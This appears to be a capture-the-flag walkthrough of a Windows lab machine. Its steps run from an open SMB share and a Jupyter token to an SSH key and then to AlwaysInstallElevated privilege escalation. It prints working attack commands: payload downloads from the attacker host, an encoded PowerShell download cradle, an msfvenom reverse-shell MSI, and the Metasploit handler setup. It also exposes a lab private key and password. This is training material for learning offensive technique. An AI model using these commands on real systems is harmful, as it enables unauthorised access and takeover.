----
I think the data science team has been a bit fast and loose with their project resources.
----

### Task 1  Start the VM

 Start Machine

Start the Virtual Machine. Please give the virtual machine about 3-5 minutes to fully start.

Machine IP: MACHINE_IP

A basic Nmap scan (`nmap -sC -sV MACHINE_IP`) should return 6 well-known ports that are open.

Good Luck!

Answer the questions below

Start the VM.

 Completed

### Task 2  Get the flags

```
┌──(witty㉿kali)-[~/Downloads]
└─$ rustscan -a 10.10.153.67 --ulimit 5500 -b 65535 -- -A -Pn
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Real hackers hack time ⌛

[~] The config file is expected to be at "/home/witty/.rustscan.toml"
[~] Automatically increasing ulimit value to 5500.
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
Open 10.10.153.67:22
Open 10.10.153.67:135
Open 10.10.153.67:139
Open 10.10.153.67:445
Open 10.10.153.67:5985
Open 10.10.153.67:8888
Open 10.10.153.67:47001
Open 10.10.153.67:49664
Open 10.10.153.67:49665
Open 10.10.153.67:49667
Open 10.10.153.67:49668
Open 10.10.153.67:49669
Open 10.10.153.67:49670
Open 10.10.153.67:49671
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-20 12:26 EDT
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 12:26
Completed NSE at 12:26, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 12:26
Completed NSE at 12:26, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 12:26
Completed NSE at 12:26, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 12:26
Completed Parallel DNS resolution of 1 host. at 12:26, 0.01s elapsed
DNS resolution of 1 IPs took 0.01s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 12:26
Scanning 10.10.153.67 [14 ports]
Discovered open port 22/tcp on 10.10.153.67
Discovered open port 139/tcp on 10.10.153.67
Discovered open port 135/tcp on 10.10.153.67
Discovered open port 445/tcp on 10.10.153.67
Discovered open port 8888/tcp on 10.10.153.67
Discovered open port 49669/tcp on 10.10.153.67
Discovered open port 49670/tcp on 10.10.153.67
Discovered open port 49664/tcp on 10.10.153.67
Discovered open port 49671/tcp on 10.10.153.67
Discovered open port 49668/tcp on 10.10.153.67
Discovered open port 47001/tcp on 10.10.153.67
Discovered open port 5985/tcp on 10.10.153.67
Discovered open port 49667/tcp on 10.10.153.67
Discovered open port 49665/tcp on 10.10.153.67
Completed Connect Scan at 12:26, 0.39s elapsed (14 total ports)
Initiating Service scan at 12:26
Scanning 14 services on 10.10.153.67
Service scan Timing: About 57.14% done; ETC: 12:28 (0:00:43 remaining)
Completed Service scan at 12:27, 56.86s elapsed (14 services on 1 host)
NSE: Script scanning 10.10.153.67.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 12:27
Completed NSE at 12:27, 9.67s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 12:27
Completed NSE at 12:27, 0.80s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 12:27
Completed NSE at 12:27, 0.00s elapsed
Nmap scan report for 10.10.153.67
Host is up, received user-set (0.19s latency).
Scanned at 2023-07-20 12:26:45 EDT for 68s

PORT      STATE SERVICE       REASON  VERSION
22/tcp    open  ssh           syn-ack OpenSSH for_Windows_7.7 (protocol 2.0)
| ssh-hostkey: 
|   2048 2b17d88a1e8c99bc5bf53d0a5eff5e5e (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDBae1NsdsMcZJNQQ2wjF2sxXK2ZF3c7qqW3TN/q91pWiDee3nghS1J1FZrUXaEj0wnAAAbYRg5vbRZRP9oEagBwfWG3QJ9AO6s5UC+iTjX+YKH6phKNmsY5N/LKY4+2EDcwa5R4uznAC/2Cy5EG6s7izvABLcRh3h/w4rVHduiwrueAZF9UjzlHBOxHDOPPVtg+0dniGhcXRuEU5FYRA8/IPL8P97djscu23btk/hH3iqdQWlC9b0CnOkD8kuyDybq9nFaebAxDW4XFj7KjCRuuu0dyn5Sr62FwRXO4wu08ePUEmJF1Gl3/fdYe3vj+iE2yewOFAhzbmFWEWtztjJb
|   256 3cc0fdb5c157ab75ac8110aee298120d (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOGl51l9Z4Mg4hFDcQz8v6XRlABMyVPWlkEXrJIg53piZhZ9WKYn0Gi4fKkzo3blDAsdqpGFQ11wwocBCSJGjQU=
|   256 e9f030bee6cfeffe2d1421a0ac457b70 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOHw9uTZkIMEgcZPW9Z28Mm+FX66+hkxk+8rOu7oI6J9
135/tcp   open  msrpc         syn-ack Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds? syn-ack
5985/tcp  open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
8888/tcp  open  http          syn-ack Tornado httpd 6.0.3
| http-robots.txt: 1 disallowed entry 
|_/ 
| http-methods: 
|_  Supported Methods: GET POST
|_http-server-header: TornadoServer/6.0.3
|_http-favicon: Unknown favicon MD5: 97C6417ED01BDC0AE3EF32AE4894FD03
| http-title: Jupyter Notebook
|_Requested resource was /login?next=%2Ftree%3F
47001/tcp open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         syn-ack Microsoft Windows RPC
49665/tcp open  msrpc         syn-ack Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack Microsoft Windows RPC
49668/tcp open  msrpc         syn-ack Microsoft Windows RPC
49669/tcp open  msrpc         syn-ack Microsoft Windows RPC
49670/tcp open  msrpc         syn-ack Microsoft Windows RPC
49671/tcp open  msrpc         syn-ack Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 58160/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 30537/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 6874/udp): CLEAN (Timeout)
|   Check 4 (port 63731/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-time: 
|   date: 2023-07-20T16:27:48
|_  start_date: N/A
|_clock-skew: 0s

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 12:27
Completed NSE at 12:27, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 12:27
Completed NSE at 12:27, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 12:27
Completed NSE at 12:27, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 72.47 seconds

┌──(witty㉿kali)-[~]
└─$ smbmap -u anonymous -H 10.10.153.67
[+] Guest session   	IP: 10.10.153.67:445	Name: 10.10.153.67                                      
        Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	datasci-team                                      	READ, WRITE	
	IPC$                                              	READ ONLY	Remote IPC
                                                                                          
┌──(witty㉿kali)-[~]
└─$ crackmapexec smb 10.10.153.67 -u guest -p ""
SMB         10.10.153.67    445    DEV-DATASCI-JUP  [*] Windows 10.0 Build 17763 x64 (name:DEV-DATASCI-JUP) (domain:DEV-DATASCI-JUP) (signing:False) (SMBv1:False)
SMB         10.10.153.67    445    DEV-DATASCI-JUP  [+] DEV-DATASCI-JUP\guest:

┌──(witty㉿kali)-[~]
└─$ smbmap -u anonymous -H 10.10.153.67 -R       
[+] Guest session   	IP: 10.10.153.67:445	Name: 10.10.153.67                                      
        Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	datasci-team                                      	READ, WRITE	
	.\datasci-team\*
	dr--r--r--                0 Thu Jul 20 12:38:04 2023	.
	dr--r--r--                0 Thu Jul 20 12:38:04 2023	..
	dr--r--r--                0 Thu Aug 25 11:27:02 2022	.ipynb_checkpoints
	fr--r--r--              146 Thu Aug 25 11:27:02 2022	Long-Tailed_Weasel_Range_-_CWHR_M157_[ds1940].csv
	dr--r--r--                0 Thu Aug 25 11:27:02 2022	misc
	fr--r--r--           414804 Thu Aug 25 11:27:02 2022	MPE63-3_745-757.pdf
	dr--r--r--                0 Thu Aug 25 11:27:02 2022	papers
	dr--r--r--                0 Thu Aug 25 11:27:02 2022	pics
	fr--r--r--               12 Thu Aug 25 11:27:02 2022	requirements.txt
	fr--r--r--             4308 Thu Aug 25 11:27:02 2022	weasel.ipynb
	fr--r--r--               51 Thu Aug 25 11:27:02 2022	weasel.txt
	.\datasci-team\.ipynb_checkpoints\*
	dr--r--r--                0 Thu Aug 25 11:27:02 2022	.
	dr--r--r--                0 Thu Aug 25 11:27:02 2022	..
	fr--r--r--               12 Thu Aug 25 11:27:02 2022	requirements-checkpoint.txt
	fr--r--r--             5972 Thu Aug 25 11:27:02 2022	weasel-checkpoint.ipynb
	.\datasci-team\misc\*
	dr--r--r--                0 Thu Aug 25 11:27:02 2022	.
	dr--r--r--                0 Thu Aug 25 11:27:02 2022	..
	fr--r--r--               52 Thu Aug 25 11:27:02 2022	jupyter-token.txt
	.\datasci-team\papers\*
	dr--r--r--                0 Thu Aug 25 11:27:02 2022	.
	dr--r--r--                0 Thu Aug 25 11:27:02 2022	..
	fr--r--r--          3491735 Thu Aug 25 11:27:02 2022	BI002_2613_Cz-40-2_Acta-T34-nr25-347-359_o.pdf
	fr--r--r--            45473 Thu Aug 25 11:27:02 2022	Dillard_Living_Like_Weasels.pdf
	.\datasci-team\pics\*
	dr--r--r--                0 Thu Aug 25 11:27:02 2022	.
	dr--r--r--                0 Thu Aug 25 11:27:02 2022	..
	fr--r--r--           301025 Thu Aug 25 11:27:02 2022	57475-weasel-facts.html
	fr--r--r--           250269 Thu Aug 25 11:27:02 2022	long-tailed-weasel
	fr--r--r--           229746 Thu Aug 25 11:27:02 2022	Weasel
	IPC$                                              	READ ONLY	Remote IPC
	.\IPC$\*
	fr--r--r--                3 Sun Dec 31 19:03:58 1600	InitShutdown
	fr--r--r--                4 Sun Dec 31 19:03:58 1600	lsass
	fr--r--r--                3 Sun Dec 31 19:03:58 1600	ntsvcs
	fr--r--r--                3 Sun Dec 31 19:03:58 1600	scerpc
	fr--r--r--                1 Sun Dec 31 19:03:58 1600	Winsock2\CatalogChangeListener-364-0
	fr--r--r--                3 Sun Dec 31 19:03:58 1600	epmapper
	fr--r--r--                1 Sun Dec 31 19:03:58 1600	Winsock2\CatalogChangeListener-214-0
	fr--r--r--                3 Sun Dec 31 19:03:58 1600	LSM_API_service
	fr--r--r--                3 Sun Dec 31 19:03:58 1600	eventlog
	fr--r--r--                1 Sun Dec 31 19:03:58 1600	Winsock2\CatalogChangeListener-14c-0
	fr--r--r--                4 Sun Dec 31 19:03:58 1600	wkssvc
	fr--r--r--                3 Sun Dec 31 19:03:58 1600	TermSrv_API_service
	fr--r--r--                3 Sun Dec 31 19:03:58 1600	Ctx_WinStation_API_service
	fr--r--r--                3 Sun Dec 31 19:03:58 1600	atsvc
	fr--r--r--                1 Sun Dec 31 19:03:58 1600	Winsock2\CatalogChangeListener-274-0
	fr--r--r--                3 Sun Dec 31 19:03:58 1600	W32TIME_ALT
	fr--r--r--                3 Sun Dec 31 19:03:58 1600	spoolss
	fr--r--r--                1 Sun Dec 31 19:03:58 1600	Winsock2\CatalogChangeListener-7a0-0
	fr--r--r--                3 Sun Dec 31 19:03:58 1600	trkwks
	fr--r--r--                3 Sun Dec 31 19:03:58 1600	SessEnvPublicRpc
	fr--r--r--                1 Sun Dec 31 19:03:58 1600	Winsock2\CatalogChangeListener-3d8-0
	fr--r--r--                4 Sun Dec 31 19:03:58 1600	srvsvc
	fr--r--r--                1 Sun Dec 31 19:03:58 1600	Winsock2\CatalogChangeListener-6a0-0
	fr--r--r--                1 Sun Dec 31 19:03:58 1600	Winsock2\CatalogChangeListener-26c-0
	fr--r--r--                1 Sun Dec 31 19:03:58 1600	PIPE_EVENTROOT\CIMV2SCM EVENT PROVIDER

we find the token to enter jupyter

┌──(witty㉿kali)-[~]
└─$ smbclient \\\\10.10.153.67\\datasci-team -U "guest"
Password for [WORKGROUP\guest]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Jul 20 12:38:04 2023
  ..                                  D        0  Thu Jul 20 12:38:04 2023
  .ipynb_checkpoints                 DA        0  Thu Aug 25 11:26:47 2022
  Long-Tailed_Weasel_Range_-_CWHR_M157_[ds1940].csv      A      146  Thu Aug 25 11:26:46 2022
  misc                               DA        0  Thu Aug 25 11:26:47 2022
  MPE63-3_745-757.pdf                 A   414804  Thu Aug 25 11:26:46 2022
  papers                             DA        0  Thu Aug 25 11:26:47 2022
  pics                               DA        0  Thu Aug 25 11:26:47 2022
  requirements.txt                    A       12  Thu Aug 25 11:26:46 2022
  weasel.ipynb                        A     4308  Thu Aug 25 11:26:46 2022
  weasel.txt                          A       51  Thu Aug 25 11:26:46 2022

		15587583 blocks of size 4096. 8943538 blocks available
smb: \> cd misc
smb: \misc\> ls
  .                                  DA        0  Thu Aug 25 11:26:47 2022
  ..                                 DA        0  Thu Aug 25 11:26:47 2022
  jupyter-token.txt                   A       52  Thu Aug 25 11:26:47 2022

		15587583 blocks of size 4096. 8943538 blocks available
smb: \misc\> get jupyter-token.txt
getting file \misc\jupyter-token.txt of size 52 as jupyter-token.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
smb: \misc\> exit

┌──(witty㉿kali)-[~]
└─$ cat jupyter-token.txt                       
067470c5ddsadc54153ghfjd817d15b5d5f5341e56b0dsad78a

login

Click on the plus sign to add a cell
Enter any Python into the cell and press `Ctl+Enter` to run the cell

or file > new terminal 

using attackbox

The list of available updates is more than a week old.
To check for new updates run: sudo apt update


This message is shown once a day. To disable it please create the
/home/dev-datasci/.hushlogin file.
(base) dev-datasci@DEV-DATASCI-JUP:~$ ls
anaconda3  anacondainstall.sh  datasci-team  dev-datasci-lowpriv_id_ed25519
(base) dev-datasci@DEV-DATASCI-JUP:~$ cat dev-datasci-lowpriv_id_ed25519
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACBUoe5ZSezzC65UZhWt4dbvxKor+dNggEhudzK+JSs+YwAAAKjQ358n0N+f
JwAAAAtzc2gtZWQyNTUxOQAAACBUoe5ZSezzC65UZhWt4dbvxKor+dNggEhudzK+JSs+Yw
AAAED9OhQumFOiC3a05K+X6h22gQga0sQzmISvJJ2YYfKZWVSh7llJ7PMLrlRmFa3h1u/E
qiv502CASG53Mr4lKz5jAAAAI2Rldi1kYXRhc2NpLWxvd3ByaXZAREVWLURBVEFTQ0ktSl
VQAQI=
-----END OPENSSH PRIVATE KEY-----

┌──(witty㉿kali)-[~/Downloads]
└─$ nano dev-datasci_rsa     
                                                                                  
┌──(witty㉿kali)-[~/Downloads]
└─$ chmod 600 dev-datasci_rsa 


┌──(witty㉿kali)-[~/Downloads]
└─$ ssh -i dev-datasci_rsa dev-datasci-lowpriv@10.10.193.136

Microsoft Windows [Version 10.0.17763.3287]
(c) 2018 Microsoft Corporation. All rights reserved.

dev-datasci-lowpriv@DEV-DATASCI-JUP C:\Users\dev-datasci-lowpriv>whoami
dev-datasci-jup\dev-datasci-lowpriv
dev-datasci-lowpriv@DEV-DATASCI-JUP C:\Users\dev-datasci-lowpriv>powershell       
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\dev-datasci-lowpriv> ls


    Directory: C:\Users\dev-datasci-lowpriv
Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        8/25/2022   6:20 AM                .ssh
d-r---        8/25/2022   5:22 AM                3D Objects
d-r---        8/25/2022   5:22 AM                Contacts
d-r---        8/25/2022   7:39 AM                Desktop
d-r---        8/25/2022   5:22 AM                Documents
d-r---        8/25/2022   5:22 AM                Downloads
d-r---        8/25/2022   5:22 AM                Favorites
d-r---        8/25/2022   5:22 AM                Links
d-r---        8/25/2022   5:22 AM                Music
d-r---        8/25/2022   5:22 AM                Saved Games
d-r---        8/25/2022   5:22 AM                Searches
d-r---        8/25/2022   5:22 AM                Videos


PS C:\Users\dev-datasci-lowpriv> cd Desktop
PS C:\Users\dev-datasci-lowpriv\Desktop> ls


    Directory: C:\Users\dev-datasci-lowpriv\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        8/25/2022   5:21 AM       28916488 python-3.10.6-amd64.exe
-a----        8/25/2022   7:40 AM             27 user.txt


PS C:\Users\dev-datasci-lowpriv\Desktop> cat user.txt
THM{w3as3ls_@nd_pyth0ns}

PS C:\Users\dev-datasci-lowpriv\Desktop> iwr http://10.8.19.103/winPEASany_ofs.exe -outfile winpeas.exe

┌──(witty㉿kali)-[~/Downloads]
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.193.136 - - [20/Jul/2023 15:47:20] "GET /winPEASany_ofs.exe HTTP/1.1" 200 -

+----------¦ Checking AlwaysInstallElevated
+  https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalat
ion#alwaysinstallelevated
    AlwaysInstallElevated set to 1 in HKLM!
    AlwaysInstallElevated set to 1 in HKCU!

PS C:\Users\dev-datasci-lowpriv\Desktop> Invoke-WebRequest -Uri 'http://10.8.19.103/PowerUp.ps1' -Out
File 'PowerUp.ps1'

PS C:\Users\dev-datasci-lowpriv\Desktop> . .\PowerUp.ps1
PS C:\Users\dev-datasci-lowpriv\Desktop> ls


    Directory: C:\Users\dev-datasci-lowpriv\Desktop

 
Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        7/20/2023  12:56 PM         494860 PowerUp.ps1
-a----        8/25/2022   5:21 AM       28916488 python-3.10.6-amd64.exe
-a----        8/25/2022   7:40 AM             27 user.txt
-a----        7/20/2023  12:47 PM        1834496 winpeas.exe


PS C:\Users\dev-datasci-lowpriv\Desktop> Invoke-AllChecks
 
[*] Running Invoke-AllChecks


[*] Checking if user is in a local group with administrative privileges...


[*] Checking for unquoted service paths...
Get-WmiObject : Access denied  
At C:\Users\dev-datasci-lowpriv\Desktop\PowerUp.ps1:457 char:21
+     $VulnServices = Get-WmiObject -Class win32_service | Where-Object ...
+                     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : InvalidOperation: (:) [Get-WmiObject], ManagementException
    + FullyQualifiedErrorId : GetWMIManagementException,Microsoft.PowerShell.Commands.GetWmiObjectC  
   ommand
 


[*] Checking service executable and argument permissions...
Get-WMIObject : Access denied  
At C:\Users\dev-datasci-lowpriv\Desktop\PowerUp.ps1:488 char:5
+     Get-WMIObject -Class win32_service | Where-Object {$_ -and $_.pat ...
+     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : InvalidOperation: (:) [Get-WmiObject], ManagementException
    + FullyQualifiedErrorId : GetWMIManagementException,Microsoft.PowerShell.Commands.GetWmiObjectC  
   ommand
 


[*] Checking service permissions...
Get-WmiObject : Access denied  
At C:\Users\dev-datasci-lowpriv\Desktop\PowerUp.ps1:534 char:17
+     $Services = Get-WmiObject -Class win32_service | Where-Object {$_ ...
+                 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : InvalidOperation: (:) [Get-WmiObject], ManagementException
    + FullyQualifiedErrorId : GetWMIManagementException,Microsoft.PowerShell.Commands.GetWmiObjectC  
   ommand
  


[*] Checking %PATH% for potentially hijackable .dll locations...

 
HijackablePath : C:\Users\dev-datasci-lowpriv\AppData\Local\Programs\Python\Python310\Scripts\       
AbuseFunction  : Write-HijackDll -OutputFile 'C:\Users\dev-datasci-lowpriv\AppData\Local\Programs\Py 
                 thon\Python310\Scripts\\wlbsctrl.dll' -Command '...'

HijackablePath : C:\Users\dev-datasci-lowpriv\AppData\Local\Programs\Python\Python310\
AbuseFunction  : Write-HijackDll -OutputFile 'C:\Users\dev-datasci-lowpriv\AppData\Local\Programs\Py 
                 thon\Python310\\wlbsctrl.dll' -Command '...'

HijackablePath : C:\Users\dev-datasci-lowpriv\AppData\Local\Microsoft\WindowsApps\
AbuseFunction  : Write-HijackDll -OutputFile
                 'C:\Users\dev-datasci-lowpriv\AppData\Local\Microsoft\WindowsApps\\wlbsctrl.dll'    
                 -Command '...'





[*] Checking for AlwaysInstallElevated registry key...


OutputFile    :  
AbuseFunction : Write-UserAddMSI

 

 

[*] Checking for Autologon credentials in registry...


DefaultDomainName    : DEV-DATASCI-JUP
DefaultUserName      : dev-datasci-lowpriv
DefaultPassword      : wUqnKWqzha*W!PWrPRWi!M8faUn
AltDefaultDomainName :
AltDefaultUserName   :
AltDefaultPassword   :





[*] Checking for vulnerable registry autoruns and configs...


[*] Checking for vulnerable schtask files/configs...


[*] Checking for unattended install files...


[*] Checking for encrypted web.config strings...


[*] Checking for encrypted application pool and virtual directory passwords...

┌──(witty㉿kali)-[~/Downloads]
└─$ msfconsole            
                                                  
# cowsay++
 ____________
< metasploit >
 ------------
       \   ,__,
        \  (oo)____
           (__)    )\
              ||--|| *


       =[ metasploit v6.3.4-dev                           ]
+ -- --=[ 2294 exploits - 1200 auxiliary - 409 post       ]
+ -- --=[ 968 payloads - 45 encoders - 11 nops            ]
+ -- --=[ 9 evasion                                       ]

Metasploit tip: Set the current module's RHOSTS with 
database values using hosts -R or services 
-R
Metasploit Documentation: https://docs.metasploit.com/

msf6 > use exploit/multi/script/web_delivery
[*] Using configured payload python/meterpreter/reverse_tcp
msf6 exploit(multi/script/web_delivery) > set PAYLOAD windows/meterpreter/reverse_tcp
PAYLOAD => windows/meterpreter/reverse_tcp
msf6 exploit(multi/script/web_delivery) > set LHOST 10.8.19.103
LHOST => 10.8.19.103
msf6 exploit(multi/script/web_delivery) > set LPORT 4444
LPORT => 4444
msf6 exploit(multi/script/web_delivery) > set target PSH
target => PSH
msf6 exploit(multi/script/web_delivery) > run
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.

[*] Started reverse TCP handler on 10.8.19.103:4444 
[*] Using URL: http://10.8.19.103:8080/aTTrkWg3qi0tB
[*] Server started.
[*] Run the following command on the target machine:
powershell.exe -nop -w hidden -e WwBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoAUwBlAGMAdQByAGkAdAB5AFAAcgBvAHQAbwBjAG8AbAA9AFsATgBlAHQALgBTAGUAYwB1AHIAaQB0AHkAUAByAG8AdABvAGMAbwBsAFQAeQBwAGUAXQA6ADoAVABsAHMAMQAyADsAJABxAEoAXwBDAD0AbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAOwBpAGYAKABbAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBQAHIAbwB4AHkAXQA6ADoARwBlAHQARABlAGYAYQB1AGwAdABQAHIAbwB4AHkAKAApAC4AYQBkAGQAcgBlAHMAcwAgAC0AbgBlACAAJABuAHUAbABsACkAewAkAHEASgBfAEMALgBwAHIAbwB4AHkAPQBbAE4AZQB0AC4AVwBlAGIAUgBlAHEAdQBlAHMAdABdADoAOgBHAGUAdABTAHkAcwB0AGUAbQBXAGUAYgBQAHIAbwB4AHkAKAApADsAJABxAEoAXwBDAC4AUAByAG8AeAB5AC4AQwByAGUAZABlAG4AdABpAGEAbABzAD0AWwBOAGUAdAAuAEMAcgBlAGQAZQBuAHQAaQBhAGwAQwBhAGMAaABlAF0AOgA6AEQAZQBmAGEAdQBsAHQAQwByAGUAZABlAG4AdABpAGEAbABzADsAfQA7AEkARQBYACAAKAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AOAAuADEAOQAuADEAMAAzADoAOAAwADgAMAAvAGEAVABUAHIAawBXAGcAMwBxAGkAMAB0AEIALwBxAHQAVgBBAEQAWgBaAHQAdwBVAEgAaAA0AE8AJwApACkAOwBJAEUAWAAgACgAKABuAGUAdwAtAG8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADgALgAxADkALgAxADAAMwA6ADgAMAA4ADAALwBhAFQAVAByAGsAVwBnADMAcQBpADAAdABCACcAKQApADsA

nope

- **AlwaysInstallElevated** is a windows feature that allows standard user account with no administrative privileges software packaged in the Microsoft Windows Installer (MSI) format with admin privs.
- We can leverage this configuration to elevate our privileges by generating a custom executable with the MSI format.
- we can utilize the msiexec utility to execute the MSI executable, which will give us an elevated session.
- The Always Install Elevated feature is configured in the Windows Registry.

┌──(witty㉿kali)-[~/Downloads]
└─$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.8.19.103 LPORT=4444 -f msi > setup.msi
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of msi file: 159744 bytes

┌──(witty㉿kali)-[~/Downloads]
└─$ msfconsole            
                                                  
# cowsay++
 ____________
< metasploit >
 ------------
       \   ,__,
        \  (oo)____
           (__)    )\
              ||--|| *


       =[ metasploit v6.3.4-dev                           ]
+ -- --=[ 2294 exploits - 1200 auxiliary - 409 post       ]
+ -- --=[ 968 payloads - 45 encoders - 11 nops            ]
+ -- --=[ 9 evasion                                       ]

Metasploit tip: Metasploit can be configured at startup, see 
msfconsole --help to learn more
Metasploit Documentation: https://docs.metasploit.com/

msf6 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/x64/shell_reverse_tcp
payload => windows/x64/shell_reverse_tcp
msf6 exploit(multi/handler) > set lhost 10.8.19.103
lhost => 10.8.19.103
msf6 exploit(multi/handler) > set lport 4444
lport => 4444
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.8.19.103:4444 

PS C:\Users\dev-datasci-lowpriv\Desktop> iwr http://10.8.19.103/setup.msi -
outfile setup.msi 

┌──(witty㉿kali)-[~/Downloads]
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.253.75 - - [20/Jul/2023 19:46:08] "GET /setup.msi HTTP/1.1" 200 -

dev-datasci-lowpriv@DEV-DATASCI-JUP C:\Users\dev-datasci-lowpriv>msiexec /quiet /qn /i C:\Users\dev-datasci-lowpri
v\Desktop\setup.msi

[*] Started reverse TCP handler on 10.8.19.103:4444 

we need to run runas command . Runas command is just like sudo in linux we can justify the user through which we want to run a specific command !

runas /user:[username] "command"

DefaultDomainName    : DEV-DATASCI-JUP
DefaultUserName      : dev-datasci-lowpriv
DefaultPassword      : wUqnKWqzha*W!PWrPRWi!M8faUn

dev-datasci-lowpriv@DEV-DATASCI-JUP C:\Users\dev-datasci-lowpriv>runas /user:dev-datasci-lowpriv "msiexec /quiet /qn /i C:\Users\dev-datasci-lowp
riv\Desktop\setup.msi"
Enter the password for dev-datasci-lowpriv:

[*] Command shell session 1 opened (10.8.19.103:4444 -> 10.10.253.75:50259) at 2023-07-20 19:50:35 -0400


Shell Banner:
Microsoft Windows [Version 10.0.17763.3287]
-----
          

C:\Windows\system32>
C:\Users\Administrator\Desktop>type root.txt
type root.txt
THM{evelated_w3as3l_l0ngest_boi}

msf6 exploit(multi/handler) > sessions

Active sessions
===============

  Id  Name  Type               Information                      Connection
  --  ----  ----               -----------                      ----------
  1         shell x64/windows  Shell Banner: Microsoft Windows  10.8.19.103:4444 -> 10.10.253.75
                                [Version 10.0.17763.3287] ----  :50259 (10.10.253.75)
                               -

msf6 exploit(multi/handler) > sessions -u -1
[*] Executing 'post/multi/manage/shell_to_meterpreter' on session(s): [-1]

[*] Upgrading session ID: 1
[*] Starting exploit/multi/handler
[*] Started reverse TCP handler on 10.8.19.103:4444 

[*] Sending stage (200774 bytes) to 10.10.253.75
